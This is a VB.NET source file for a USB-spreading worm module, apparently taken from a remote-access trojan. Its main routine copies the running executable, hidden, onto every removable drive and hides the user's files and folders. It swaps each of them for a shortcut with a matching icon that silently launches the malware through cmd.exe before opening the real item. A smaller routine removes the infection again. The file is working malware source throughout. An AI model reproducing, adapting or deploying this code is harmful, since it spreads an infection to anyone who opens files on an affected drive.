Public Class USB
    Private Off As Boolean = False
    Dim thread As Threading.Thread = Nothing
    Dim r As New Random
    Public ExeName As String = r.Next(199997, 88886777) & ".exe"
    Public Sub Start()
        On Error Resume Next
        If thread Is Nothing Then
            thread = New Threading.Thread(AddressOf usb, 1)
            thread.Start()
        End If
    End Sub
    Public Sub clean()

        Off = True
        Do Until thread Is Nothing
            Threading.Thread.Sleep(1)
        Loop
        For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
            Try
                If x.IsReady Then
                    If x.DriveType = IO.DriveType.Removable Or
                    x.DriveType = IO.DriveType.CDRom Then
                        If IO.File.Exists(x.Name & ExeName) Then
                            IO.File.SetAttributes(x.Name _
                            & ExeName, IO.FileAttributes.Normal)
                            IO.File.Delete(x.Name & ExeName)
                        End If
                        For Each xx As String In IO.Directory.GetFiles(x.Name)
                            Try
                                IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                If xx.ToLower.EndsWith(".lnk") Then
                                    IO.File.Delete(xx)
                                End If
                            Catch ex As Exception
                            End Try
                        Next
                        For Each xx As String In IO.Directory.GetDirectories(x.Name)
                            Try
                                With New IO.DirectoryInfo(xx)
                                    .Attributes = IO.FileAttributes.Normal
                                End With
                            Catch ex As Exception
                            End Try
                        Next
                    End If
                End If
            Catch ex As Exception
            End Try
        Next
    End Sub
    Sub usb()
        Off = False
        Do Until Off = True
            For Each x In IO.DriveInfo.GetDrives
                Try
                    If x.IsReady Then
                        If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType _
                        .Removable Or x.DriveType = IO.DriveType.CDRom Then
                            Try
                                If IO.File.Exists(x.Name & ExeName) Then
                                    IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal)
                                End If
                                IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                For Each xx As String In IO.Directory.GetFiles(x.Name)
                                    If IO.Path.GetExtension(xx).ToLower <> ".lnk" And _
                                    xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then
                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                        IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                        With CreateObject("WScript.Shell").CreateShortcut _
                                        (x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                            .TargetPath = "cmd.exe"
                                            .WorkingDirectory = ""
                                            .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                             & " " & ChrW(34)) & "&start " & New IO.FileInfo(xx) _
                                            .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
                                            .IconLocation = GetIcon(IO.Path.GetExtension(xx))
                                            .Save()
                                        End With
                                    End If
                                Next
                                For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                    IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                    IO.File.Delete(x.Name & New IO.DirectoryInfo(xx).Name & " .lnk")
                                    With CreateObject("WScript.Shell") _
                                    .CreateShortcut(x.Name & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                        .TargetPath = "cmd.exe"
                                        .WorkingDirectory = ""
                                        .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                         & " " & ChrW(34)) & "&explorer /root,""%CD%" & New  _
                                         IO.DirectoryInfo(xx).Name & """ & exit"
                                        .IconLocation = "%SystemRoot%\system32\SHELL32.dll,3"
                                        .Save()
                                    End With
                                Next
                            Catch ex As Exception
                            End Try
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
            Threading.Thread.Sleep(3000)
        Loop
        thread = Nothing
    End Sub
    Function GetIcon(ByVal ext As String) As String
        Try
            Dim r = Microsoft.Win32.Registry _
            .LocalMachine.OpenSubKey("Software\Classes\", False)
            Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False) _
            .GetValue("") & "\DefaultIcon\").GetValue("", "")
            If e.Contains(",") = False Then e &= ",0"
            Return e
        Catch ex As Exception
            Return ""
        End Try
    End Function
End Class